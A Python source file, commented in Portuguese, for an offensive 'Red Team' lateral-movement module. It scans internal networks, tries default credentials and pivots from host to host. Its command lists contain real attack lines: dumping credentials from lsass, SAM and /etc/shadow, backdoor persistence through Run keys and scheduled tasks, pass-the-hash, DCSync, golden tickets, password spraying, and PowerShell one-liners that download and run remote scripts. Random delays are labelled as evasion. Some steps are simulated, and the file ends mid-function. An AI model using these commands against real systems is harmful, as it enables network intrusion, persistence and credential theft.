#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔗 LATERAL MOVEMENT MODULE 🔗
Módulo de movimento lateral e auto-pivoting para Red Team
Automatiza descoberta e exploração de redes internas

⚠️  ATENÇÃO: USE APENAS EM AMBIENTES AUTORIZADOS ⚠️
"""

import socket
import struct
import threading
import time
import subprocess
import re
import json
import ipaddress
import random
from typing import Dict, List, Optional, Tuple, Set, Any
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

@dataclass
class NetworkHost:
    """Host descoberto na rede"""
    ip: str
    hostname: str = ""
    os: str = ""
    open_ports: List[int] = field(default_factory=list)
    services: Dict[int, str] = field(default_factory=dict)
    vulnerabilities: List[str] = field(default_factory=list)
    credentials: Dict[str, str] = field(default_factory=dict)
    trust_level: str = "unknown"  # low, medium, high, critical
    pivot_potential: float = 0.0

@dataclass
class PivotPath:
    """Caminho de pivot descoberto"""
    source_host: str
    target_host: str
    method: str
    protocol: str
    port: int
    credentials: Dict[str, str]
    success_rate: float
    lateral_move_type: str

@dataclass
class CredentialSet:
    """Conjunto de credenciais descoberto"""
    username: str
    password: str
    hash_type: str = ""
    hash_value: str = ""
    domain: str = ""
    source: str = ""
    privilege_level: str = "user"
    services: List[str] = field(default_factory=list)

class LateralMovement:
    """
    🔗 Engine de movimento lateral e auto-pivoting
    
    Características:
    - Descoberta automática de redes internas
    - Harvest de credenciais automatizado
    - Pass-the-hash e Kerberos attacks
    - Living-off-the-land techniques
    - Auto-pivoting inteligente
    - Mapeamento de confiança entre hosts
    """
    
    def __init__(self, logger=None):
        self.logger = logger
        self.discovered_hosts = {}  # IP -> NetworkHost
        self.discovered_credentials = []  # List[CredentialSet]
        self.pivot_paths = []  # List[PivotPath]
        self.current_position = None  # IP atual
        self.trust_relationships = {}  # Mapeamento de confiança
        
        # Portas comuns para pivoting
        self.pivot_ports = {
            22: "ssh",
            23: "telnet", 
            135: "rpc",
            139: "smb",
            445: "smb",
            1433: "mssql",
            3306: "mysql",
            3389: "rdp",
            5432: "postgresql",
            5985: "winrm",
            5986: "winrm-ssl"
        }
        
        # Credenciais comuns para brute force
        self.common_credentials = [
            ("admin", "admin"),
            ("administrator", "administrator"),
            ("admin", "password"),
            ("root", "root"),
            ("root", "toor"),
            ("guest", "guest"),
            ("user", "user"),
            ("test", "test"),
            ("sa", "sa"),
            ("postgres", "postgres"),
            ("mysql", "mysql")
        ]
        
        # Living off the land commands
        self.lolbins = {
            "windows": {
                "discovery": [
                    "whoami /all",
                    "net user",
                    "net group",
                    "net localgroup administrators",
                    "wmic qfe list",
                    "systeminfo",
                    "ipconfig /all",
                    "route print",
                    "arp -a",
                    "netstat -an",
                    "tasklist /svc",
                    "wmic service list brief",
                    "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                    "dir c:\\users",
                    "net share"
                ],
                "credential_harvest": [
                    "reg save hklm\\sam sam.save",
                    "reg save hklm\\security security.save",
                    "reg save hklm\\system system.save",
                    "vaultcmd /list",
                    "cmdkey /list",
                    "dir /s *password*",
                    "dir /s *cred*",
                    "findstr /si password *.txt *.xml *.config"
                ],
                "persistence": [
                    "schtasks /create /tn backdoor /tr cmd.exe /sc onlogon",
                    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d cmd.exe",
                    "wmic /node:localhost /namespace:\\\\root\\subscription path __EventFilter create Name='backdoor', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfRawData_PerfOS_System\"'"
                ],
                "credential_dump": [
                    "mimikatz.exe \"sekurlsa::logonpasswords\" exit",
                    "procdump.exe -ma lsass.exe lsass.dmp",
                    "reg save hklm\\sam sam.save",
                    "reg save hklm\\security security.save",
                    "reg save hklm\\system system.save",
                    "vaultcmd /listcreds:\"Windows Credentials\" /all"
                ],
                "ad_attacks": [
                    "nltest /dclist:",
                    "net group \"Domain Admins\" /domain",
                    "net accounts /domain",
                    "dsquery computer",
                    "dsquery user",
                    "ldapsearch -x -h dc.domain.com -s sub \"(objectclass=computer)\"",
                    "bloodhound-python -u user -p pass -d domain.com -c all"
                ],
                "kerberos_attacks": [
                    "rubeus.exe kerberoast /outfile:kerberoast.txt",
                    "rubeus.exe asreproast /outfile:asreproast.txt",
                    "rubeus.exe golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash",
                    "rubeus.exe silver /service:cifs/target.domain.com /user:user /domain:domain.com /sid:S-1-5-21-... /rc4:hash"
                ]
            },
            "linux": {
                "discovery": [
                    "id",
                    "uname -a",
                    "cat /etc/passwd",
                    "cat /etc/group", 
                    "sudo -l",
                    "crontab -l",
                    "ps aux",
                    "netstat -tulpn",
                    "ss -tulpn",
                    "ip route",
                    "ip addr",
                    "arp -a",
                    "mount",
                    "cat /proc/version",
                    "cat /etc/issue",
                    "find / -perm -4000 -type f 2>/dev/null",
                    "find / -name '*.conf' 2>/dev/null | head -20"
                ],
                "credential_harvest": [
                    "cat /etc/shadow",
                    "cat ~/.bash_history",
                    "cat ~/.ssh/id_rsa",
                    "find / -name id_rsa 2>/dev/null",
                    "find / -name '*.key' 2>/dev/null",
                    "grep -r password /etc/ 2>/dev/null",
                    "find /home -name '*.txt' -exec grep -l password {} \\;",
                    "cat /var/log/auth.log | grep -i pass"
                ]
            }
        }

    def auto_pivot_scan(self, initial_target: str, max_depth: int = 3) -> Dict[str, Any]:
        """
        🔗 Scan automático com pivoting progressivo
        """
        results = {
            "initial_target": initial_target,
            "discovered_hosts": {},
            "pivot_paths": [],
            "credentials_found": [],
            "network_map": {},
            "trust_relationships": {},
            "attack_paths": [],
            "max_depth_reached": 0
        }
        
        if self.logger:
            self.logger.warning(f"🔗 Iniciando auto-pivot scan em {initial_target}")
        
        # 1. Comprometer host inicial
        initial_host = self._compromise_initial_host(initial_target)
        if not initial_host:
            if self.logger:
                self.logger.error(f"Falha ao comprometer host inicial: {initial_target}")
            return results
        
        self.current_position = initial_target
        self.discovered_hosts[initial_target] = initial_host
        
        # 2. Descoberta de rede local
        internal_networks = self._discover_internal_networks(initial_target)
        
        # 3. Pivoting progressivo
        current_depth = 0
        targets_queue = [(initial_target, 0)]  # (host, depth)
        processed_hosts = set()
        
        while targets_queue and current_depth < max_depth:
            current_host, depth = targets_queue.pop(0)
            
            if current_host in processed_hosts:
                continue
            
            processed_hosts.add(current_host)
            current_depth = max(current_depth, depth)
            
            if self.logger:
                self.logger.info(f"🔗 Pivoting desde {current_host} (profundidade: {depth})")
            
            # Descobrir hosts alcançáveis
            reachable_hosts = self._discover_reachable_hosts(current_host, internal_networks)
            
            # Tentar comprometer hosts descobertos
            for target_host in reachable_hosts:
                if target_host not in processed_hosts:
                    compromised_host = self._attempt_lateral_movement(current_host, target_host)
                    
                    if compromised_host:
                        self.discovered_hosts[target_host] = compromised_host
                        targets_queue.append((target_host, depth + 1))
                        
                        # Criar path de pivot
                        pivot_path = PivotPath(
                            source_host=current_host,
                            target_host=target_host,
                            method=compromised_host.credentials.get("method", "unknown"),
                            protocol=compromised_host.credentials.get("protocol", "unknown"),
                            port=int(compromised_host.credentials.get("port", 0)),
                            credentials=compromised_host.credentials,
                            success_rate=1.0,
                            lateral_move_type="credential_reuse"
                        )
                        self.pivot_paths.append(pivot_path)
        
        # 4. Análise de relacionamentos de confiança
        self._analyze_trust_relationships()
        
        # 5. Identificar caminhos de ataque críticos
        attack_paths = self._identify_attack_paths()
        
        # Compilar resultados
        results.update({
            "discovered_hosts": {ip: self._serialize_host(host) for ip, host in self.discovered_hosts.items()},
            "pivot_paths": [self._serialize_pivot_path(path) for path in self.pivot_paths],
            "credentials_found": [self._serialize_credentials(cred) for cred in self.discovered_credentials],
            "trust_relationships": self.trust_relationships,
            "attack_paths": attack_paths,
            "max_depth_reached": current_depth
        })
        
        if self.logger:
            self.logger.warning(f"🔗 Auto-pivot completo: {len(self.discovered_hosts)} hosts, {len(self.pivot_paths)} paths")
        
        return results

    def credential_harvesting(self, target_host: str, os_type: str = "auto") -> List[CredentialSet]:
        """
        🔑 Harvest automatizado de credenciais
        """
        harvested_creds = []
        
        if self.logger:
            self.logger.info(f"🔑 Iniciando harvest de credenciais em {target_host}")
        
        # Auto-detectar OS se necessário
        if os_type == "auto":
            os_type = self._detect_os_type(target_host)
        
        # Comandos específicos por OS
        if os_type.lower() in ["windows", "win"]:
            commands = self.lolbins["windows"]["credential_harvest"]
        else:
            commands = self.lolbins["linux"]["credential_harvest"]
        
        # Executar comandos de harvest
        for command in commands:
            try:
                if self.logger:
                    self.logger.debug(f"Executando: {command}")
                
                # Simular execução (em implementação real usaria RCE)
                result = self._simulate_command_execution(target_host, command)
                
                if result:
                    # Extrair credenciais do resultado
                    extracted_creds = self._extract_credentials_from_output(result, command)
                    harvested_creds.extend(extracted_creds)
                
                time.sleep(random.uniform(0.5, 1.5))  # Delay para evasão
                
            except Exception as e:
                if self.logger:
                    self.logger.debug(f"Erro executando {command}: {str(e)}")
                continue
        
        # Adicionar à lista global
        self.discovered_credentials.extend(harvested_creds)
        
        if self.logger:
            self.logger.warning(f"🔑 Harvest completo: {len(harvested_creds)} credenciais encontradas")
        
        return harvested_creds

    def pass_the_hash_attack(self, source_host: str, target_hosts: List[str], hash_data: Dict) -> List[Dict]:
        """
        🔐 Ataque Pass-the-Hash automatizado
        """
        results = []
        
        if self.logger:
            self.logger.warning(f"🔐 Iniciando Pass-the-Hash de {source_host}")
        
        for target in target_hosts:
            try:
                # Simular ataque PTH
                pth_result = self._simulate_pass_the_hash(source_host, target, hash_data)
                
                if pth_result["success"]:
                    results.append({
                        "target": target,
                        "method": "pass_the_hash",
                        "success": True,
                        "username": hash_data.get("username"),
                        "hash_type": hash_data.get("hash_type"),
                        "access_level": pth_result.get("access_level", "user")
                    })
                    
                    if self.logger:
                        self.logger.error(f"💀 PTH SUCESSO: {target} com hash {hash_data.get('hash_type')}")
                
                time.sleep(random.uniform(1.0, 3.0))  # Delay para evasão
                
            except Exception as e:
                if self.logger:
                    self.logger.debug(f"Erro PTH em {target}: {str(e)}")
                continue
        
        return results

    def golden_ticket_attack(self, domain_info: Dict, krbtgt_hash: str) -> Dict:
        """
        🎫 Ataque Golden Ticket (simulado)
        """
        if self.logger:
            self.logger.warning(f"🎫 Simulando Golden Ticket para {domain_info.get('domain')}")
        
        # Simular criação de golden ticket
        golden_ticket = {
            "domain": domain_info.get("domain"),
            "sid": domain_info.get("sid"),
            "krbtgt_hash": krbtgt_hash,
            "username": "Administrator",
            "groups": ["Domain Admins", "Enterprise Admins"],
            "ticket_lifetime": "10 years",
            "success": True,
            "access_level": "domain_admin"
        }
        
        return golden_ticket

    def _compromise_initial_host(self, target: str) -> Optional[NetworkHost]:
        """
        💥 Compromete host inicial
        """
        host = NetworkHost(ip=target)
        
        try:
            # 1. Port scan básico
            host.open_ports = self._quick_port_scan(target)
            
            # 2. Service detection
            for port in host.open_ports:
                service = self._detect_service(target, port)
                if service:
                    host.services[port] = service
            
            # 3. Tentativa de credenciais padrão
            for port, service in host.services.items():
                creds = self._try_default_credentials(target, port, service)
                if creds:
                    host.credentials.update(creds)
                    host.trust_level = "high"
                    break
            
            # 4. OS Detection
            host.os = self._detect_os_type(target)
            
            # 5. Calcular potencial de pivot
            host.pivot_potential = self._calculate_pivot_potential(host)
            
            return host
            
        except Exception as e:
            if self.logger:
                self.logger.debug(f"Erro comprometendo {target}: {str(e)}")
            return None

    def _discover_internal_networks(self, host: str) -> List[str]:
        """
        🕵️ Descobre redes internas acessíveis
        """
        networks = []
        
        try:
            # Simular descoberta de redes via ARP, routing table, etc.
            # Em implementação real usaria comandos como:
            # ip route, arp -a, netstat -rn
            
            # Gerar redes comuns baseado no IP do host
            ip_obj = ipaddress.ip_address(host)
            
            if ip_obj.is_private:
                # Adicionar redes privadas comuns
                if host.startswith("192.168."):
                    networks.append("192.168.0.0/16")
                elif host.startswith("10."):
                    networks.append("10.0.0.0/8")
                elif host.startswith("172."):
                    networks.append("172.16.0.0/12")
                
                # Adicionar rede local do host
                network = ipaddress.ip_network(f"{host}/24", strict=False)
                networks.append(str(network))
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"Erro descobrindo redes de {host}: {str(e)}")
        
        return list(set(networks))

    def _discover_reachable_hosts(self, source_host: str, networks: List[str]) -> List[str]:
        """
        🔍 Descobre hosts alcançáveis nas redes
        """
        reachable_hosts = []
        
        for network_str in networks:
            try:
                network = ipaddress.ip_network(network_str)
                
                # Limitar scan para evitar overhead
                hosts_to_scan = list(network.hosts())[:50]  # Máximo 50 hosts por rede
                
                with ThreadPoolExecutor(max_workers=20) as executor:
                    futures = []
                    
                    for host_ip in hosts_to_scan:
                        future = executor.submit(self._ping_host, str(host_ip))
                        futures.append((future, str(host_ip)))
                    
                    for future, host_ip in futures:
                        try:
                            if future.result(timeout=2):  # 2 segundos timeout
                                reachable_hosts.append(host_ip)
                        except:
                            continue
            
            except Exception as e:
                if self.logger:
                    self.logger.debug(f"Erro scanning network {network_str}: {str(e)}")
                continue
        
        return reachable_hosts

    def _attempt_lateral_movement(self, source_host: str, target_host: str) -> Optional[NetworkHost]:
        """
        🎯 Tenta movimento lateral para host alvo
        """
        if target_host == source_host:
            return None
        
        target = NetworkHost(ip=target_host)
        
        try:
            # 1. Port scan
            target.open_ports = self._quick_port_scan(target_host)
            
            if not target.open_ports:
                return None
            
            # 2. Service detection
            for port in target.open_ports:
                service = self._detect_service(target_host, port)
                if service:
                    target.services[port] = service
            
            # 3. Tentar credenciais descobertas
            for cred in self.discovered_credentials:
                for port, service in target.services.items():
                    if service in cred.services or not cred.services:
                        success = self._try_credential_reuse(target_host, port, service, cred)
                        if success:
                            target.credentials = {
                                "username": cred.username,
                                "password": cred.password,
                                "method": "credential_reuse",
                                "protocol": service,
                                "port": str(port)
                            }
                            target.trust_level = "high"
                            return target
            
            # 4. Tentar credenciais padrão
            for port, service in target.services.items():
                creds = self._try_default_credentials(target_host, port, service)
                if creds:
                    target.credentials.update(creds)
                    target.trust_level = "medium"
                    return target
            
            # 5. Detectar vulnerabilidades
            vulns = self._quick_vuln_scan(target_host, target.open_ports)
            if vulns:
                target.vulnerabilities = vulns
                target.trust_level = "low"
                return target
        
        except Exception as e:
            if self.logger:
                self.logger.debug(f"Erro movimento lateral {source_host} -> {target_host}: {str(e)}")
        
        return None

    def _analyze_trust_relationships(self):
        """
        🔗 Analisa relacionamentos de confiança entre hosts
        """
        for source_ip, source_host in self.discovered_hosts.items():
            for target_ip, target_host in self.discovered_hosts.items():
                if source_ip != target_ip:
                    trust_score = self._calculate_trust_score(source_host, target_host)
                    
                    if trust_score > 0.5:
                        if source_ip not in self.trust_relationships:
                            self.trust_relationships[source_ip] = []
                        
                        self.trust_relationships[source_ip].append({
                            "target": target_ip,
                            "trust_score": trust_score,
                            "trust_type": self._determine_trust_type(source_host, target_host)
                        })

    def _identify_attack_paths(self) -> List[Dict]:
        """
        🎯 Identifica caminhos de ataque críticos
        """
        attack_paths = []
        
        # Buscar hosts com privilégios elevados
        high_value_targets = []
        for ip, host in self.discovered_hosts.items():
            if host.trust_level == "critical" or "admin" in str(host.credentials).lower():
                high_value_targets.append(ip)
        
        # Buscar caminhos para targets de alto valor
        for target in high_value_targets:
            paths = self._find_paths_to_target(target)
            attack_paths.extend(paths)
        
        return attack_paths

    # ===============================================
    # 🔧 FUNÇÕES AUXILIARES
    # ===============================================

    def _quick_port_scan(self, target: str) -> List[int]:
        """Port scan rápido"""
        open_ports = []
        
        for port in self.pivot_ports.keys():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
            except:
                continue
        
        return open_ports

    def _detect_service(self, target: str, port: int) -> Optional[str]:
        """Detecta serviço na porta"""
        return self.pivot_ports.get(port, "unknown")

    def _detect_os_type(self, target: str) -> str:
        """Detecta tipo de OS"""
        # Implementação simplificada
        try:
            # Simular detecção via TTL, banners, etc.
            return random.choice(["Windows", "Linux", "Unix"])
        except:
            return "Unknown"

    def _try_default_credentials(self, target: str, port: int, service: str) -> Optional[Dict]:
        """Testa credenciais padrão"""
        for username, password in self.common_credentials:
            # Simular tentativa de login
            success = random.random() < 0.1  # 10% chance de sucesso
            
            if success:
                return {
                    "username": username,
                    "password": password,
                    "method": "default_credentials",
                    "protocol": service,
                    "port": str(port)
                }
        
        return None

    def _calculate_pivot_potential(self, host: NetworkHost) -> float:
        """Calcula potencial de pivot"""
        score = 0.0
        
        # Mais portas abertas = maior potencial
        score += len(host.open_ports) * 0.1
        
        # Credenciais = alto potencial
        if host.credentials:
            score += 0.5
        
        # Trust level
        trust_scores = {"critical": 1.0, "high": 0.8, "medium": 0.5, "low": 0.2}
        score += trust_scores.get(host.trust_level, 0.0)
        
        return min(score, 1.0)

    def _ping_host(self, host: str) -> bool:
        """Verifica se host está ativo"""
        try:
            # Simular ping
            return random.random() < 0.3  # 30% dos hosts estão ativos
        except:
            return False

    def _try_credential_reuse(self, target: str, port: int, service: str, cred: CredentialSet) -> bool:
        """Tenta reutilização de credenciais"""
        # Simular tentativa
        return random.random() < 0.4  # 40% chance de sucesso

    def _quick_vuln_scan(self, target: str, ports: List[int]) -> List[str]:
        """Scan rápido de vulnerabilidades"""
        vulns = []
        
        # Simular detecção de vulnerabilidades comuns
        common_vulns = ["MS17-010", "CVE-2021-44228", "CVE-2019-0708"]
        
        for vuln in common_vulns:
            if random.random() < 0.05:  # 5% chance
                vulns.append(vuln)
        
        return vulns

    def _simulate_command_execution(self, target: str, command: str) -> Optional[str]:
        """Simula execução de comando"""
        # Em implementação real, usaria RCE real
        simulated_outputs = {
            "whoami": "nt authority\\system",
            "id": "uid=0(root) gid=0(root) groups=0(root)",
            "net user": "Administrator\nGuest\nkrbtgt",
            "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash"
        }
        
        for pattern, output in simulated_outputs.items():
            if pattern in command.lower():
                return output
        
        return "Command executed successfully"

    def _extract_credentials_from_output(self, output: str, command: str) -> List[CredentialSet]:
        """Extrai credenciais da saída de comandos"""
        creds = []
        
        # Patterns para extrair credenciais
        if "net user" in command:
            # Extrair usuários do Windows
            users = re.findall(r'\b([a-zA-Z0-9_]+)\b', output)
            for user in users:
                if user not in ["User", "accounts", "for"]:
                    cred = CredentialSet(
                        username=user,
                        password="",
                        source=command,
                        services=["smb", "rdp", "winrm"]
                    )
                    creds.append(cred)
        
        elif "cat /etc/passwd" in command:
            # Extrair usuários do Linux
            lines = output.split('\n')
            for line in lines:
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 3:
                        username = parts[0]
                        cred = CredentialSet(
                            username=username,
                            password="",
                            source=command,
                            services=["ssh", "telnet"]
                        )
                        creds.append(cred)
        
        return creds

    def _simulate_pass_the_hash(self, source: str, target: str, hash_data: Dict) -> Dict:
        """Simula ataque Pass-the-Hash"""
        # Simular sucesso baseado em fatores
        success_factors = [
            hash_data.get("hash_type") == "NTLM",
            "admin" in hash_data.get("username", "").lower(),
            target != source
        ]
        
        success_rate = sum(success_factors) / len(success_factors)
        success = random.random() < success_rate
        
        return {
            "success": success,
            "access_level": "admin" if success and "admin" in hash_data.get("username", "") else "user",
            "method": "pass_the_hash"
        }

    def _calculate_trust_score(self, source: NetworkHost, target: NetworkHost) -> float:
        """Calcula score de confiança entre hosts"""
        score = 0.0
        
        # Mesmo domínio/rede
        if source.ip.split('.')[0:3] == target.ip.split('.')[0:3]:
            score += 0.3
        
        # Credenciais similares
        if source.credentials and target.credentials:
            if source.credentials.get("username") == target.credentials.get("username"):
                score += 0.4
        
        # OS similar
        if source.os == target.os:
            score += 0.2
        
        return min(score, 1.0)

    def _determine_trust_type(self, source: NetworkHost, target: NetworkHost) -> str:
        """Determina tipo de confiança"""
        if source.credentials and target.credentials:
            if source.credentials.get("username") == target.credentials.get("username"):
                return "shared_credentials"
        
        if source.os == target.os:
            return "same_platform"
        
        return "network_proximity"

    def _find_paths_to_target(self, target: str) -> List[Dict]:
        """Encontra caminhos para target específico"""
        paths = []
        
        for path in self.pivot_paths:
            if path.target_host == target:
                paths.append({
                    "path": f"{path.source_host} -> {path.target_host}",
                    "method": path.method,
                    "risk_level": "HIGH" if path.success_rate > 0.8 else "MEDIUM"
                })
        
        return paths

    # Serialization methods
    def _serialize_host(self, host: NetworkHost) -> Dict:
        """Serializa NetworkHost para JSON"""
        return {
            "ip": host.ip,
            "hostname": host.hostname,
            "os": host.os,
            "open_ports": host.open_ports,
            "services": host.services,
            "vulnerabilities": host.vulnerabilities,
            "credentials": host.credentials,
            "trust_level": host.trust_level,
            "pivot_potential": host.pivot_potential
        }

    def _serialize_pivot_path(self, path: PivotPath) -> Dict:
        """Serializa PivotPath para JSON"""
        return {
            "source_host": path.source_host,
            "target_host": path.target_host,
            "method": path.method,
            "protocol": path.protocol,
            "port": path.port,
            "credentials": path.credentials,
            "success_rate": path.success_rate,
            "lateral_move_type": path.lateral_move_type
        }

    def _serialize_credentials(self, cred: CredentialSet) -> Dict:
        """Serializa CredentialSet para JSON"""
        return {
            "username": cred.username,
            "password": cred.password,
            "hash_type": cred.hash_type,
            "hash_value": cred.hash_value,
            "domain": cred.domain,
            "source": cred.source,
            "privilege_level": cred.privilege_level,
            "services": cred.services
        }

    def cleanup(self):
        """Limpeza de recursos"""
        self.discovered_hosts.clear()
        self.discovered_credentials.clear()
        self.pivot_paths.clear()
        self.trust_relationships.clear()

    # ===============================
    # MÉTODOS AVANÇADOS ADICIONADOS
    # ===============================

    def advanced_ad_enumeration(self, target_host: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """
        🎯 Enumeração avançada de Active Directory
        """
        results = {
            "domain_info": {},
            "users": [],
            "groups": [],
            "computers": [],
            "gpos": [],
            "trusts": [],
            "spns": []
        }

        if self.logger:
            self.logger.info(f"🎯 Iniciando enumeração avançada de AD em {target_host}")

        # Comandos de enumeração AD
        ad_commands = {
            "domain_info": [
                "nltest /domain_trusts",
                "net accounts /domain",
                "wmic computersystem get domain",
                "dsquery * -filter \"(objectClass=domain)\" -attr name,distinguishedName"
            ],
            "users": [
                "net user /domain",
                "dsquery user -limit 0",
                "wmic useraccount get name,sid,disabled,lockout",
                "Get-ADUser -Filter * -Properties *"
            ],
            "groups": [
                "net group /domain",
                "net group \"Domain Admins\" /domain",
                "net group \"Enterprise Admins\" /domain",
                "dsquery group -limit 0"
            ],
            "computers": [
                "dsquery computer -limit 0",
                "Get-ADComputer -Filter * -Properties *",
                "nltest /dclist:"
            ],
            "spns": [
                "setspn -Q */*",
                "dsquery * \"DC=domain,DC=com\" -filter \"(servicePrincipalName=*)\" -attr servicePrincipalName"
            ]
        }

        for category, commands in ad_commands.items():
            for cmd in commands:
                try:
                    # Simular execução de comando
                    task_id = f"ad_enum_{category}_{len(results[category])}"
                    results[category].append({
                        "command": cmd,
                        "task_id": task_id,
                        "status": "pending"
                    })
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Erro na enumeração AD: {e}")

        return results

    def kerberos_attacks(self, target_domain: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """
        🎫 Ataques Kerberos avançados
        """
        results = {
            "kerberoasting": [],
            "asreproasting": [],
            "golden_ticket": None,
            "silver_ticket": None,
            "overpass_the_hash": None
        }

        if self.logger:
            self.logger.info(f"🎫 Iniciando ataques Kerberos contra {target_domain}")

        # Kerberoasting
        kerberoast_commands = [
            "rubeus.exe kerberoast /outfile:kerberoast.txt",
            "impacket-GetUserSPNs domain/user:password -request",
            "powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat\""
        ]

        for cmd in kerberoast_commands:
            results["kerberoasting"].append({
                "command": cmd,
                "task_id": f"kerb_{len(results['kerberoasting'])}",
                "status": "pending"
            })

        # ASREPRoasting
        asrep_commands = [
            "rubeus.exe asreproast /outfile:asreproast.txt",
            "impacket-GetNPUsers domain/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt"
        ]

        for cmd in asrep_commands:
            results["asreproasting"].append({
                "command": cmd,
                "task_id": f"asrep_{len(results['asreproasting'])}",
                "status": "pending"
            })

        # Golden Ticket (requer hash krbtgt)
        if "krbtgt_hash" in credentials:
            golden_cmd = f"rubeus.exe golden /user:Administrator /domain:{target_domain} /sid:S-1-5-21-domain-sid /krbtgt:{credentials['krbtgt_hash']}"
            results["golden_ticket"] = {
                "command": golden_cmd,
                "task_id": "golden_ticket",
                "status": "pending"
            }

        return results

    def pass_the_hash_attacks(self, target_hosts: List[str], ntlm_hashes: Dict[str, str]) -> Dict[str, Any]:
        """
        🔑 Ataques Pass-the-Hash
        """
        results = {
            "successful_auths": [],
            "failed_auths": [],
            "lateral_movement_paths": []
        }

        if self.logger:
            self.logger.info(f"🔑 Iniciando ataques Pass-the-Hash em {len(target_hosts)} hosts")

        for target in target_hosts:
            for username, ntlm_hash in ntlm_hashes.items():
                # Comandos PTH
                pth_commands = [
                    f"impacket-psexec {username}@{target} -hashes :{ntlm_hash}",
                    f"impacket-wmiexec {username}@{target} -hashes :{ntlm_hash}",
                    f"impacket-smbexec {username}@{target} -hashes :{ntlm_hash}",
                    f"crackmapexec smb {target} -u {username} -H {ntlm_hash}",
                    f"evil-winrm -i {target} -u {username} -H {ntlm_hash}"
                ]

                for cmd in pth_commands:
                    task_info = {
                        "target": target,
                        "username": username,
                        "command": cmd,
                        "task_id": f"pth_{target}_{username}_{len(results['successful_auths'])}",
                        "status": "pending"
                    }
                    results["successful_auths"].append(task_info)

        return results

    def dcsync_attack(self, domain_controller: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """
        🎯 Ataque DCSync para extrair hashes do AD
        """
        results = {
            "dcsync_commands": [],
            "target_accounts": ["krbtgt", "Administrator", "Domain Admins"],
            "extracted_hashes": []
        }

        if self.logger:
            self.logger.warning(f"🎯 Iniciando ataque DCSync contra {domain_controller}")

        # Comandos DCSync
        dcsync_commands = [
            f"mimikatz.exe \"lsadump::dcsync /domain:{domain_controller} /user:krbtgt\"",
            f"mimikatz.exe \"lsadump::dcsync /domain:{domain_controller} /user:Administrator\"",
            f"impacket-secretsdump domain/user:password@{domain_controller}",
            f"crackmapexec smb {domain_controller} -u user -p password --ntds"
        ]

        for cmd in dcsync_commands:
            results["dcsync_commands"].append({
                "command": cmd,
                "task_id": f"dcsync_{len(results['dcsync_commands'])}",
                "status": "pending",
                "risk_level": "CRITICAL"
            })

        return results

    def bloodhound_collection(self, target_domain: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """
        🩸 Coleta de dados BloodHound para mapeamento de AD
        """
        results = {
            "collection_methods": [],
            "output_files": [],
            "analysis_ready": False
        }

        if self.logger:
            self.logger.info(f"🩸 Iniciando coleta BloodHound para {target_domain}")

        # Métodos de coleta BloodHound
        bloodhound_commands = [
            f"bloodhound-python -u {credentials.get('username', 'user')} -p {credentials.get('password', 'pass')} -d {target_domain} -c all",
            f"SharpHound.exe -c all -d {target_domain}",
            f"powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -Domain {target_domain}\"",
            f"rusthound -d {target_domain} -u {credentials.get('username', 'user')} -p {credentials.get('password', 'pass')} -o bloodhound_data.zip"
        ]

        for cmd in bloodhound_commands:
            results["collection_methods"].append({
                "command": cmd,
                "task_id": f"bloodhound_{len(results['collection_methods'])}",
                "status": "pending",
                "output_format": "json"
            })

        return results

    def credential_spraying(self, target_hosts: List[str], usernames: List[str], passwords: List[str]) -> Dict[str, Any]:
        """
        🎯 Password spraying para descoberta de credenciais
        """
        results = {
            "spray_attempts": [],
            "successful_logins": [],
            "locked_accounts": [],
            "spray_statistics": {
                "total_attempts": 0,
                "success_rate": 0.0,
                "lockout_rate": 0.0
            }
        }

        if self.logger:
            self.logger.info(f"🎯 Iniciando credential spraying em {len(target_hosts)} hosts")

        spray_delay = 30  # Delay entre tentativas para evitar lockout

        for password in passwords:
            for target in target_hosts:
                for username in usernames:
                    # Comandos de spray
                    spray_commands = [
                        f"crackmapexec smb {target} -u {username} -p {password}",
                        f"crackmapexec winrm {target} -u {username} -p {password}",
                        f"rpcclient -U \"{username}%{password}\" {target}",
                        f"smbclient -U \"{username}%{password}\" //{target}/C$"
                    ]

                    for cmd in spray_commands:
                        attempt = {
                            "target": target,
                            "username": username,
                            "password": password,
                            "command": cmd,
                            "task_id": f"spray_{target}_{username}_{len(results['spray_attempts'])}",
                            "status": "pending",
                            "delay": spray_delay
                        }
                        results["spray_attempts"].append(attempt)
                        results["spray_statistics"]["total_attempts"] += 1

        return results

    def living_off_the_land_persistence(self, target_os: str, target_host: str) -> Dict[str, Any]:
        """
        🏠 Técnicas Living off the Land para persistência
        """
        results = {
            "persistence_methods": [],
            "scheduled_tasks": [],
            "registry_modifications": [],
            "file_modifications": []
        }

        if self.logger:
            self.logger.info(f"🏠 Implementando persistência LotL em {target_host}")

        if "windows" in target_os.lower():
            # Windows LotL persistence
            windows_persistence = [
                # Registry persistence
                {
                    "method": "registry_run",
                    "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /t REG_SZ /d powershell.exe",
                    "location": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
